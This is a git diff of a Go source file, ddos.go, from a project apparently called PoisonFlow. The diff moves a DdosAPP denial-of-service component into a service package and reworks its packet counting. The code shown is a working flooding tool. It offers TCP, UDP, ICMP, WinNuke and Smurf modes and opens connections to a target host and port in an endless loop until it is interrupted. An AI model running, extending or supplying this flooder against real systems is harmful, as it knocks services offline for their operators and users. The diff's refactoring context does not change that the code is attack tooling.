@@ -1,11 +1,13 @@
-// Package utils -----------------------------
+// Package service  -----------------------------
 // @file      : ddos.go
 // @author    : fzf
 // @time      : 2023/5/9 上午10:28
 // -------------------------------------------
-package utils
+package service
 
 import (
+	"PoisonFlow/src/conf"
+	"PoisonFlow/src/utils"
 	"fmt"
 	"github.com/sirupsen/logrus"
 	"net"
@@ -16,15 +18,10 @@ import (
 	"time"
 )
 
-var (
-	CountPacket int
-	packet      int
-)
-
 type DdosAPP struct {
 }
 
-func (p *DdosAPP) Execute(config *PoisonConfig) {
+func (p *DdosAPP) Execute(config *conf.PoisonConfig) {
 	var address = fmt.Sprintf("%s:%d", config.Host, config.Port)
 	switch config.Mode {
 	case "TCP":
@@ -43,7 +40,7 @@ func (p *DdosAPP) Execute(config *PoisonConfig) {
 			logrus.Errorf("Please check format of Smurf host : 192.168.255.255")
 		}
 	default:
-		Check.CheckExit("Please check format of ddos mode : TCP、UDP、ICMP、WinNuke、Smurf")
+		utils.Check.CheckExit("Please check format of ddos mode : TCP、UDP、ICMP、WinNuke、Smurf")
 	}
 }
 
@@ -62,19 +59,20 @@ func (p *DdosAPP) TCPFlood(address string) {
 
 func (p *DdosAPP) SendPacket(mode, address string) {
 	// 捕获ctrl+c
-	c := make(chan os.Signal, 1)
-	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
-	go p.CountPacket()
+	signal.Notify(Signal, syscall.SIGINT, syscall.SIGTERM)
+	go PacketSpeed()
 	// 发送数据包
 	for {
 		select {
 		// 捕获ctrl + c
-		case _ = <-c:
-			logrus.Printf("stopped sending a total of %d packets", CountPacket)
+		case _ = <-Signal:
+			logrus.Printf("stopped sending a total of %d packets", CounterPacket)
 			os.Exit(0)
-		default:
+		case <-time.After(0 * time.Millisecond):
 			conn, err := net.DialTimeout(mode, address, time.Millisecond*300)
-			packet++
+			TemporaryPacket += 1
+			CounterPacket += TemporaryPacket
+			TemporaryPacket = 0
 			if err != nil {
 				break
 			}
@@ -82,20 +80,7 @@ func (p *DdosAPP) SendPacket(mode, address string) {
 			if err != nil {
 				break
 			}
+
 		}
 	}
-}
-
-func (p *DdosAPP) CountPacket() {
-	// 3秒中
-
-	ticker := time.NewTicker(3 * time.Second)
-	defer ticker.Stop()
-	// 协程输出发送pps
-	for range ticker.C {
-		logrus.Infof("Sended packet : %d  pps: %d \n", packet, packet/3)
-		CountPacket += packet
-		packet = 0
-	}
-
 }
